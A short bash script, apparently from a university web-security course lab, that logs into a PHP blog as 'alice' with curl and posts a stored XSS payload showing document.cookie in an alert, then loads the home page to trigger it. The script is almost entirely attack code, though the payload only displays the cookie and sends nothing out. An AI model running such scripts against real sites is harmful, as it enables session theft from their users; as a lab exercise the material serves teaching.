#!/bin/bash

if [ $# -ne 2 ]; then
	PREFIX="ugster21.student.cs.uwaterloo.ca/sdsuo"
else
	IP=$1
	PORT=$2
	PREFIX=$IP:$PORT
fi

echo "=====[Setup]====="
POST_PAGE="$PREFIX/post.php"
HOME_PAGE="$PREFIX/index.php"
VIEW_PAGE="$PREFIX/view.php"
echo "Using Login Page at: $POST_PAGE"
echo "Using Home Page at: $HOME_PAGE"
echo "Using View Page at: $VIEW_PAGE"

echo "=====[Login]====="
USERNAME="alice"
PASSWORD="passw0rd"
echo "Using username: $USERNAME"
echo "Using password: $PASSWORD"
echo "Logging in with POST request"

curl \
-c "cookie.txt" \
-d "form=login" \
-d "submit=Login" \
-d "username=$USERNAME" \
-d "password=$PASSWORD" \
$POST_PAGE
echo

echo "=====[Stored XSS Attack to Embed Cookie Stealing Code in Content Field of Aritcle Post]====="
ARTICLE_TYPE=1
ARTICLE_POPUP="<script type='text/javascript'> alert(document.cookie);</script>"
ARTICLE_TITLE="Cookie Stealing Attack on Content Field of Article Post"

echo "Using article title: $ARTICLE_TITLE"
echo "Using article content: $ARTICLE_POPUP"

curl \
-b "cookie.txt" \
-d "form=content" \
-d "submit=Post" \
-d "type=$ARTICLE_TYPE" \
--data-urlencode "title=$ARTICLE_TITLE" \
--data-urlencode "content=$ARTICLE_POPUP" \
$POST_PAGE

echo "=====[Execute Cookie Stealing Code with CSRF]====="
echo "Showing index page with cookie stealing code embedded article post"
curl -b "cookie.txt" $HOME_PAGE
